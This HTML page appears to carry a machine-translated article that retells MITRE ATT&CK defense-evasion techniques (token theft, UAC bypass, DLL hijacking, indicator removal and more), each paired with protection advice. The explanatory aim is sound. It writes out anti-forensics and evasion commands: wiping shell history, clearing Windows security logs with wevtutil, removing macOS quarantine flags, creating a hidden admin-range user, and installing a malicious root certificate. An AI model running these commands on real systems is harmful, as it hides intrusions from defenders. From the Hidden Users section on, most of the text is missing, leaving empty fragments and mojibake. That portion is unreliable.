<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We study Adversarial Tactics, Techniques & Common Knowledge (ATT @ CK). Enterprise Tactics. Part 5</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Defense Evasion 
 Links to all parts: 
 Part 1. Getting Initial Access 
 Part 2. Execution 
 Part 3. Persistence 
 Part 4. Privilege Escalation 
 Part...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We study Adversarial Tactics, Techniques & Common Knowledge (ATT @ CK). Enterprise Tactics. Part 5</h1><div class="post__text post__text-html js-mediator-article"><h1>  <a href="https://attack.mitre.org/tactics/TA0005/">Defense Evasion</a> </h1><br>  <b>Links to all parts:</b> <br>  <a href="https://habr.com/post/423405/">Part 1. Getting Initial Access</a> <br>  <a href="https://habr.com/post/424027/">Part 2. Execution</a> <br>  <a href="https://habr.com/post/425177/">Part 3. Persistence</a> <br>  <a href="https://habr.com/post/428602/">Part 4. Privilege Escalation</a> <br>  <a href="https://habr.com/post/432624/">Part 5. Defense Evasion</a> <br>  <a href="https://habr.com/post/433566/">Part 6. Obtaining Credential Access</a> <br>  <a href="https://habr.com/ru/post/436350/">Part 7. Discovery</a> <br>  <a href="https://habr.com/ru/post/439026/">Part 8. Lateral Movement (Lateral Movement)</a> <br><br>  The ‚ÄúProtection Bypass‚Äù section describes techniques by which an attacker can hide malicious activity and prevent its detection by means of protection.  Different variations of techniques from other sections of the attack chain that help overcome specific defenses and preventive measures taken by the defending party are included in the protection bypass techniques.  In turn, protection bypass techniques are used in all phases of an attack. <br><a name="habracut"></a><br>  <i>The author is not responsible for the possible consequences of the application of the information contained in the article, and also apologizes for any inaccuracies in some formulations and terms.</i>  <i>The published information is a free recount of the content of <a href="https://attack.mitre.org/wiki/Main_Page">MITER ATT &amp; CK</a> .</i> <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1134">Handling access tokens (Access Token Manipulation)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Attackers can use access tokens (Access Token) to perform their actions in various user or system security contexts, thus avoiding the detection of malicious activity.  An adversary can use the Windows API functions to copy access tokens from existing processes (Token stealing), for this it must be in the context of a privileged user (for example, an administrator).  Theft of access tokens is typically used to elevate privileges from administrator level to System level.  An adversary can also use the account access token to authenticate the remote system if the account has the necessary permissions on the remote system.  There are three main ways to abuse access tokens. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <b>Theft and impersonation of tokens.</b> <br>  Token impersonation is the ability of the OS to start threads in a security context other than the context of the process to which this thread belongs.  In other words, impersonating tokens allows you to perform any actions on behalf of another user.  An adversary can create a duplicate access token using the <i>DuplicateTokenEX</i> function and use <i>ImpersonateLoggedOnUser</i> to call the stream in the context of the logged in user or use <i>SetThreadToken</i> to assign an access token to the stream. <br><br>  <b>Creating a process using an access token.</b> <br>  An attacker can create an access token using the <i>DuplicateTokenEX</i> function and then use it with <i>CreateProcessWithTokenW</i> to create a new process running in the context of the impersonated user. <br><br>  <b>Obtaining and impersonating access tokens.</b> <br>  The opponent, having a username and password, can create a login session using the <i>LogonUser</i> API function, which will return a copy of the session access token of the new session, and then, using the <i>SetThreadToken function</i> , assign the resulting token to the stream. <br>  <i>Metasploit Meterpreter</i> and <i>CobaltStrike</i> have tools for manipulating access tokens to increase privileges. <br><br>  <i>Protection recommendations:</i> In order to fully use the tactics described above, an attacker must have system administrator rights, so do not forget to limit the privileges of ordinary users.  Any user can trick access tokens if they have valid credentials.  Restrict the ability of users and groups to create access tokens: <br><br>  <i>GPO: Computer Configuration&gt; [Policies]&gt; Windows Settings&gt; Security Settings&gt; Local Policies&gt; User Rights Assignment: Create a token object</i> . <br><br>  Also determine who can replace local or network service process tokens: <br>  <i>GPO: Computer Configuration&gt; [Policies]&gt; Windows Settings&gt; Security Settings&gt; Local Policies&gt; User Policy Assignment: Replace a process level token.</i> <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1197">Creating BITS Jobs (BITS Jobs)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> Windows Background Intelligent Transfer Service (BITS) is an asynchronous file transfer mechanism through the Component Object Model (COM) using low bandwidth.  BITS is usually used by update programs, instant messengers and other applications that prefer to run in the background without interrupting the work of other network applications.  File transfer tasks are represented as BITS tasks that contain a queue of one or more file operations.  The interface for creating and managing BITS tasks is available in the PowerShell and BITSAdmin tool.  Attackers can use BITS to download, run, and clean up after running the malicious code.  BITS tasks are stored autonomously in the BITS database, and no new files or registry entries are created in the system, BITS is often allowed by the firewall.  Using BITS tasks, you can gain a foothold in the system by creating lengthy tasks (90 days by default) or by calling an arbitrary program after completing a BITS task or an error (including after restarting the OS). <br><br>  <i>Protection recommendations:</i> BITS is a standard OS functionality, the use of which is difficult to distinguish from malicious activity, therefore, the protection vector should be aimed at preventing the attacker from launching tools at the beginning of the attack chain.  A complete disabling of BITS can lead to the termination of updating legitimate software, but you can consider limiting access to the BITS interface for specific users and access groups, you can also limit the lifetime of BITS tasks, which is set by changing the following keys: <br><br><ul><li>  <i>HKEY_LOCAL_MACHINE \ Software \ Policies \ Microsoft \ Windows \ BITS \ JobInactivityTimeout;</i> </li><li>  <i>HKEY_LOCAL_MACHINE \ Software \ Policies \ Microsoft \ Windows \ BITS \ MaxDownloadTime</i> . </li></ul><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1009">Binary padding data (Binary Padding)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Description:</i> Some security tools scan files by searching for static signatures.  Opponents can add data to malicious files in order to increase their volume to a value exceeding the maximum allowed size of the scanned file or to modify the hash of the file in order to bypass the black lists of blocking the launch of files by hashes. <br><br>  <i>Security</i> Tips <i>:</i> Provide identification of potentially dangerous software by using tools such as <i>AppLocker</i> , whitelisting tools and software restriction policies. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1088">Bypass User Account Control</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> There are many ways to circumvent UAC, the most common of which are implemented in the <a href="https://github.com/hfiref0x/UACME">UACMe</a> project.  New ways of circumventing UAC are regularly detected, similar to the abuse of the <a href="https://www.fortinet.com/blog/threat-research/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware.html">eventvwr.exe</a> system application, which can execute a binary file or script with elevated privileges.  Malicious programs can also be embedded in trusted processes, with which UAC allows privilege escalation without prompting the user. <br><br>  To bypass UAC using eventvwr.exe in the Windows registry, the key is modified: <br>  <i>[HKEY_CURRENT_USER] \ Software \ Classes \ mscfile \ shell \ open \ command</i> . <br><br>  To bypass UAC using sdclt.exe, the keys in the Windows registry are modified: <br>  <i>[HKEY_CURRENT_USER] \ Software \ Microsoft \ Windows \ CurrentVersion \ App Paths \ control.exe;</i> <i><br></i>  <i>[HKEY_CURRENT_USER] \ Software \ Classes \ exefile \ shell \ runas \ command \ isolatedCommand.</i> <br><br>  <i>Security</i> Tips <i>:</i> Remove users from the local Administrators group on the protected systems.  If possible, enable the highest level of protection in the UAC settings. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1191">CMSTP</a> <a href="https://pentestlab.blog/tag/scriptlet/">(AppLocker ByPass - CMSTP)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Microsoft Connection Manager Profile Installer (cmstp.exe) is the "Connection Manager Profile Installer" built into Windows.  Cmstp.exe can take an inf-file as a parameter, so an attacker can prepare a special malicious INF for loading and executing DLLs or scriptlets (* .sct) from remote servers, bypassing AppLocker and other locks, because cmstp.exe is signed with a Microsoft digital certificate. <br><br>  <i>Protection recommendations:</i> Blocking the launch of potentially dangerous applications.  Monitoring or complete blocking of <i>C: \ Windows \ System32 \ cmstp.exe launches</i> . <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1146">Clear Command History (Clear Command History)</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> For the convenience of users, all commands executed by the user in the terminal are logged in macOS and Linux systems.  Users can quickly execute the command they performed earlier in another session.  When a user logs in, the command history is saved to the file that is specified in the HISTFILE variable.  When a user logs out, the command history is saved to the user's home directory ~ / .bash_history.  The command history file may also contain passwords entered by the user in clear text.  Criminals can either search for passwords in command history files or use measures to prevent their malicious activity from being recorded in the command history, for example: <br><br>  <i>unset HISTFILE;</i> <i><br></i>  <i>export HISTFILESIZE = 0;</i> <i><br></i>  <i>history -c;</i> <i><br></i>  <i>rm ~ / .bash_history.</i> <br><br>  <i>Protection recommendations:</i> Preventing users from deleting or writing bash_history files can prevent the adversary from abusing these files, and restricting user rights to editing the HISTFILE and HISTFILESIZE variables will ensure that the command execution log is saved. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1116">Code Signing</a> </h3><br>  <i>System:</i> Windows, macOS <br>  <i>Description: The</i> digital signature of the code provides developer authentication and a guarantee that the file has not been changed.  However, as you know, opponents can use signatures to disguise malware as legitimate binaries.  Certificates for digital signatures can be created, tampered with or stolen by an attacker.  Signing code to check the software for the first time is used in Windows, macOS, OS X and is not used in Linux due to the decentralized structure of the platform.  Code signing certificates can be used to bypass security policies that require that only signed code be executed on the system. <br><br>  <i>Protection recommendations:</i> The use of software ‚Äúwhite lists‚Äù and the choice of reliable software publishers before verifying a digital signature can prevent the execution of malicious or unreliable code in the protected system. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1109">Component Firmware</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> System <br>  <i>Description:</i> Some attackers can use complex tools to compromise computer components and install malicious firmware on them, which will run malicious code outside the operating system or even the main system firmware (Bios).  The technique is the firmware of computer components that do not have a built-in system for checking the integrity of, for example, hard drives.  A device with malicious firmware can provide constant access to the attacked system despite failures and overwriting of the hard disk.  The technique is designed to overcome software protection and integrity control. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1122">Interception of links and communications COM (Component Object Model Hijacking)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Microsoft Component Object Model (COM) is a technology for creating software based on interacting object components, each of which can be used in many programs simultaneously.  Attackers can use COM to insert malicious code that can be executed instead of legitimate via the capture of COM links and connections.  To intercept a COM object, you must replace the reference to the legitimate system component in the Windows registry.  If you further call this component, the malicious code will be executed. <br><br>  <i>Protection recommendations:</i> Preventive measures to prevent this attack are not recommended, as COM objects are part of the OS and software installed in the system.  Locking changes to COM objects can affect the stability of the operating system and software.  It is recommended to direct the protection vector to block malware and potentially dangerous software. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1196">Control Panel Items (Windows Control Panel Items)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> The tactic is the use by attackers of Windows Control Panel elements to execute arbitrary commands as a payload (for example, the <i><a href="https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered">Reaver</a></i> virus).  Malicious objects can be disguised as standard controls and delivered to the system using phishing attachments.  Utilities for viewing and configuring Windows settings are registered exe-files and CPL-files of Windows control panel elements.  CPL files are actually renamed DLLs that can be run in the following ways: <br><br><ul><li>  directly from the command line: <i>control.exe &lt;file.cpl&gt;</i> ; </li><li>  using API functions from shell32.dll: <i>rundll32.exe shell32.dll, Control_RunDLL &lt;file.cpl&gt;</i> ; </li><li>  double click on the cpl file. </li></ul><br>  Registered CPLs stored in System32 are automatically displayed in the Windows Control Panel and have a unique identifier stored in the registry: <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ ControlPanel \ NameSpace</i> <br><br>  Information about other CPLs, for example, the display name and the path to the cpl file are stored in the <i>‚ÄúCpls‚Äù</i> and <i>‚ÄúExtended Properties‚Äù</i> sections of the section: <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Control Panel</i> <br><br>  Some command line shell CPLs are registered in the section: <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Controls Folder \ {name} \ shellex \ PropertySheetHandlers</i> <br><br>  <i>Protection Recommendation:</i> Limit the launch and storage of control panel item files only in protected folders (for example, <i>C: \ Windows \ System32</i> ), enable User Account Control (UAC) and AppLocker to prevent unauthorized changes to the system.  Of course, the use of anti-virus software. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1207">DCShadow</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator <br>  <i>Description:</i> <a href="http://">DCShadow</a> assumes the creation of a fake domain controller in the attacked network with the help of which an attacker can change the AD data, including changes to any domain object, credentials and keys unnoticed for SIEM systems, using the API functionality to interact with the attacked CD.  Tools for the implementation of the attack is part of mimikatz.  DCShadow can be used to perform SID-History injection attacks and to create backdoors for the purpose of further consolidation in the system. <br><br>  <i>Protection recommendations:</i> Considering that the DCShadow technique is based on the abuse of the design features of AD, the protection vector should be aimed at preventing the launch of attack implementation tools.  You can detect an attack by analyzing the network traffic of CD replication, which runs every 15 minutes, but can be triggered by an off-schedule attacker. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1038">DLL search interception (DLL Search Order Hijacking)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description: The</i> technique is to exploit the vulnerabilities of the application's search algorithm for the DLL files they need to work ( <a href="https://technet.microsoft.com/ru-ru/library/security/2269637.aspx">MSA2269637</a> ).  Often, the DLL search directory is the working directory of the program, so attackers can replace the original DLL with a malicious one with the same file name. <br><br>  Remote attacks on DLL search can be carried out when the program installs its current directory in a remote directory, for example, a network share.  Also, attackers can directly change the way the DLL is searched and loaded by replacing the .manifest or .local files that describe the DLL search parameters.  If the attacked program works with high privileges, then the malicious DLL loaded by it will also be executed with high rights.  In this case, the technique can be used to elevate privileges from the user to the administrator or System. <br><br>  Security Tips: Disable remote boot DLL (enabled by default in Windows Server 2012+ and is available with updates for XP + and Server 2003+).  Enable the secure search mode of the DLL, which will limit the search directories to directories such as <i>% SYSTEMROOT%</i> before performing a DLL search in the current application directory. <br><br>  Enable Secure Search DLL: <br>  <i>Computer Configuration&gt; [Policies]&gt; Administrative Templates&gt; MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode.</i> <br>  Corresponding registry key: <br>  <i>HKLM \ SYSTEM \ CurrentControlSet \ Control \ Session Manager \ SafeDLLSearchMode.</i> <br><br>  Consider the feasibility of auditing the protected system to eliminate DLL weaknesses using tools such as the PowerUP module in PowerSploit.  Do not forget about blocking malicious and potentially dangerous software, as well as the implementation of <a href="https://docs.microsoft.com/ru-ru/windows/desktop/Dlls/dynamic-link-library-security">Microsoft recommendations</a> . <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1073">Side loading DLL (Side-Loading DLL)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Description: The</i> attack is based on the vulnerabilities of Side-by-Side parallel execution technology (WinSxS or SxS), the essence of which is to provide the ability to run applications using incompatible versions of the same code components.  The component assembly repository is located in the c: \ windows \ winsxs folder.  Each assembly must have a manifest associated with it ‚Äî an xml file containing information about files, classes, interfaces, libraries, and other elements of the assembly.  Like the DLL search capture techniques, opponents can trigger a user application to side load a malicious DLL, the path to which was specified in the assembly manifest file. <br><br>  <i>% TEMP% \ RarSFX% \% ALLUSERS PROFILE% \ SXS;</i> <i><br></i>  <i>% TEMP% \ RarSFX% \% ALLUSERS PROFILE% \ WinSxS.</i> <br><br>  <i>Protection recommendations:</i> Regular software updates, installation of applications in write-protected directories.  Use the sxstrace.exe program to check manifest files for side loading vulnerabilities. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1140">Deobfuscation / decryption of files or information (Deobfuscate / Decode Files or Information)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Attackers can use file obfuscation and information to hide malicious code and artifacts remaining from the invasion.  To use such files, opponents use reverse techniques to deobfuscate / decode files or information.  Such methods may involve the use of malicious software, various scripts or system utilities, for example, there is a known method of using the certutil utility to decode an executable file of a remote access tool hidden inside a certificate file.  Another example is using the copu / b command to collect binary fragments into a payload (payload). <br><br>  Payload files can be compressed, archived or encrypted to avoid detection.  Sometimes, deobfuscation or decryption may require user action (User execution).  The user may need to enter a password to open a compressed or encrypted file or script with malicious content. <br><br>  Security Tips <i>:</i> Identifying and blocking unnecessary system utilities or potentially dangerous software that can be used to deobfuscate or decrypt files using tools such as AppLocker and software restriction policies. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1089">Disabling Security Tools</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Description:</i> Attackers can disable various security tools, destroy event logging processes, registry keys, prevent security tools from starting during malicious activity, or use other methods to interfere with the operation of security scanners or event reports. <br><br>  <i>Security</i> Tips <i>:</i> Ensure that permissions for processes, registry, and files are properly configured to prevent unauthorized disabling or tampering with security features. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1211">Exploitation for Defense Evasion Exploitation</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> As with any software, security software may have vulnerabilities that could be used by an attacker to disable or circumvent them. <br><br>  <i>Protection Recommendations:</i> Regular software updates, development and implementation of a software vulnerability management process.  The use of virtualization and micro-segmentation of applications can reduce the risks of possible exploitation of vulnerabilities. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1181">EWM injection (Extra Window Memory Injection)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator, System <br>  <i>Description: The</i> technique is the abuse of additional Windows memory, the so-called Extra Window Memory (EWM).  The EWM size is 40 bytes, suitable for storing a 32-bit pointer, and is often used to refer to procedures.  Malicious programs during the attack chain can place a pointer to malicious code in EWM, which will then be launched by the process of an infected application. <br><br>  <i>Protection recommendations:</i> Considering that EWM injection techniques are based on the misuse of OS development features, protection efforts should be directed at preventing the launch of malicious programs and malicious tools.  It is good practice to identify and block potentially dangerous software using AppLocker, organizing an application whitelist, or applying Software Restriction Policies software restriction policies. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1107">File Deletion</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> Various tools, malware and other files used by the adversary can leave traces of hacking activity in the system.  Attackers can delete these artifact files during an invasion to reduce the likelihood of an attack being detected or delete them at the end of their operation.  An adversary can use both special tools for guaranteed information destruction (for example, Windows Sysinternals Sdelete), as well as tools built into the OS, for example, DEL and ipher. <br><br>  <i>Protection recommendations:</i> If possible, block the launch of unnecessary system utilities, third-party tools and potentially dangerous software that can be used to destroy files. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1006">Reading Files with File System Logical Offsets</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator <br>  <i>Description:</i> Windows can allow programs to directly access logical volumes.  Programs with direct access can read and write files directly to the hard disk, analyzing the data structure of the file system.  This method bypasses file access controls and file system monitoring.  Utilities such as NinjaCopy are used to perform the above actions in PowerShell. <br><br>  <i>Protection recommendations:</i> Blocking potentially dangerous software. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1144">Gatekeeper Bypass Bypass</a> </h3><br>  <i>System:</i> macOS <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Gatekeper technology is used in macOS and OS X, which ensures that only trusted software is launched.  When downloading an application from the Internet, a special attribute is set in the com.apple.quarantine file, which indicates that the Gatekeeper should ask the user for permission to execute the downloaded file.  The flag is set before saving the file to disk, then when the user tries to open the file, the Gatekeeper checks for the presence of the corresponding flag and, if there is one, the system will prompt the user to confirm the launch and show the URL from which the file was downloaded.  Applications downloaded to the system from a USB drive, optical, child or network drive will not cause the flag in the com.apple.quarantine file.  Some utilities and files that hit the system under attack during shadow boot (Drive-by-compromise technique) also do not trigger the flag setting for the Gatekeeper, thus bypassing the power of attorney verification.  The presence of the quarantine flag can be checked with the command: <i>xattr /path/to/MyApp.app</i> . <br><br>  You can also remove the flag with attr, but this will require elevated privileges: <br>  <i>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</i> <br><br>  Security Tips <i>:</i> In addition to Gatekeeper, you should use a ban on launching applications downloaded from outside of AppleStore. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1148">HISTCONTROL variable</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> The HISTCONTROL environment variable represents the list of parameters for saving the command history to the ~ / .bash_history file when a user logs off.  For example, the ignorespace option indicates that you do not need to save lines starting with a space, and the ignoredups option will disable saving repeated commands in a row.  On some Linux systems, the default option is the ignoreboth option, which includes the above two options.  This means that the "ls" command will not be saved in history, unlike "ls". <br><br>  HISTCONTROL is not used by default in macOS, but can be customized by the user.  Attackers can use the features of the HISTCONTROL parameters in order not to leave traces of their activities simply by inserting spaces in front of commands. <br><br>  Security Tips <i>:</i> Prevent users from changing the HISTCONTROL variable, and also make sure that HISTCONTROL is set to ignoredup and does not contain the ignoreboth and ignorespace options. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1158">Hidden files and folders (Hidden Files and Directories)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> On Windows, users can hide files using the attrib command.  It is enough to specify the attribute <i>+ h &lt;file name&gt;</i> to hide the file or "+ s" to mark the file as system.  By adding the "/ S" parameter, the attrib utility will apply the changes recursively.  In Linux / Mac, users can hide files and folders simply by typing a "." At the beginning of the file name.  After this, the files and folders will be hidden from the Finder application and such as the ls utility. <br><br>  In macOS, files can be marked with the UF_HIDDEN flag, which will turn on the prohibition of their visibility in Finder.app, but will not prohibit seeing hidden files in Terminal.app.  Many applications create hidden files and folders so as not to clutter up the user's workspace.  For example, SSH utilities create a hidden .ssh folder that stores a list of known hosts and user keys. <br><br>  Attackers can use the ability to hide files and folders, so as not to attract the attention of users. <br><br> <i>  :</i>             ‚Äî    . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1147">  (Hidden Users)</a> </h3><br> <i>:</i> macOS <br> <i>:</i> , root <br> <i>:</i>     macOS   userID,       .   <i>/Library/Preferences/com.apple.loginwindow</i>   <i>Hide500Users</i> ,      500     .  ,     &lt;500   Hide500Users      : <br><br> <i>sudo dscl. -create /User/username UniqueID 401 <br> sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool TRUE</i> <br><br> <i>  :</i>      ,          . ,     /Library/Preferences/com.apple.loginwindow. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1143">  (Hidden Window)</a> </h3><br> <i>:</i> macOS <br> <i>:</i>  <br> <i>:</i>     macOS  OS X   plist- .       apple.awt.UIElement    Java-   Dock.      ,    ,          . <br><br> <i>  :</i>   ,    plist-  apple.awt.UIElement. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1183">IFEO- (Image File Execution Options Injection)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i> , System <br> <i>:</i>  Image File Execution Options (IFEO)      ,     : <br><br><ul><li> <i>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/[executable]</i> </li><li> <i>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\[executable]</i> ,  <i>[executable]</i> ‚Äî     . </li></ul><br>  ,  <i>[executable]</i>     ,       .     IFEO    ,  ,          . <br><br> <i>  :</i>         ,  -       , ,  .      IFEO-        .           <i>Debug_process</i>  <i>Debug_only_this_process</i> . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1054">  (Indicator Blocking)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>        ,      .         ,       . <br><br>           ,         .     , ,   ,    ,         ,     . <br><br> <i>  :</i> ,     ,               .            ,              . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1066">     (Indicator Removal from Tools)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br> <i>:</i>          ,         (),  ,    ,     ,      .                    .  ,          -  / ,                 ,       . <br><br> <i>  :</i>               .         ,              . <br><br>    -          ,   AppLocker     . <br><br>             .            IDS-,    ..        ,       ¬´¬ª  .    , ,                    ,   . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1070">    (Indicator Removal on Host)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br> <i>:</i>      ,    ,     ,   .          ,     Windows Event   Linux/macOS,   /.bash_history  .var/log/*. <br><br>  ,       ,       ,    ,        .          -     . <br><br> <b>  Windows Event Logs</b> <br> Windows Event Logs ‚Äî        . Microsoft    ¬´      ,       ¬ª.     : ,   . <br> ,  ,     ,    ,      ..    ,    . <br>       : <br> <i>wevtutil cl system; <br> wevtutil cl application; <br> wevtutil cl security.</i> <br>         ,   PowerShell. <br><br> <i>  :</i>      ,           .          ,        .    ,  ,      ,     .              .        1102: ¬´   ¬ª. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1202">   (Indirect Command Execution)</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i>         Windows,    cmd. , Forfiles,     (pcalua.exe),   Windows  Linux (WSL),               ,  ¬´¬ª   . <br><br>          ,                , ,    ,   CMD. <br><br> <i>  :</i>    -      AppLocker    .            ,       . <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1130">   (Install Root Certificate)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br> <i>:</i> ,  <br> <i>:</i>        (CA).    ,            .       TLS/SSL   -.          ,     ,      .            . <br><br>             .     ,            HTTPS    -,     . <br>                              ¬´  ¬ª    ,     TLS/SSL. <br>         .               ,      . <br><br>  macOS   Ay MaMi   <i>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System/keychain path/to/malicious/cert</i>           . <br><br> <i>  :</i> HTTP Public Key Pinning (HPKP) ‚Äî          . HPKP ,        ,              . <br><br>   Windows                   (HKCU): <br><br> <i>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\ProtectedRoots\Flags = 1.</i> <br><br>        ,                  . Microsoft       authroot.stl.  Sysinternals Sigcheck        (Sigcheck[64].exe -tuv)        Microsoft Certificate Trust List. <br><br>        : <br><br> <i>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates <br> HKEY_LOCAL_MACHINE [HKEY_CURRENT_USER] \SOFTWARE[\Policies]\Microsoft\SystemCertificates\Root\Certificates</i> <br><br>      Windows-  ,     : <br><br> ‚Ä¢ 18F7C1FCC3090203FD5BAA2F861A754976C8DD25; <br> ‚Ä¢ 245C97DF7514E7CF2DF8BE72AE957B9E04741E85; <br> ‚Ä¢ 3B1EFD3A66EA28B16697394703A72CA340A05BD5; <br> ‚Ä¢ 7F88CD7223F3C813818C994614A89C99FA3B5247; <br> ‚Ä¢ 8F43288AD272F3103B6FB1428485EA3014C0BCFE; <br> ‚Ä¢ A43489159A520F0D93D032CCAF37E7FE20A8B419; <br> ‚Ä¢ BE36A4562FB2EE05DBB3D32323ADF445084ED656; <br> ‚Ä¢ CDD4EEAE6000AC7F40C3802C171E30148030C072. <br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1118">InstallUtil</a> </h3><br>  <i>System:</i> Windows <br> <i>:</i>  <br> <i>:</i> InstallUtil ‚Äî    Windows,  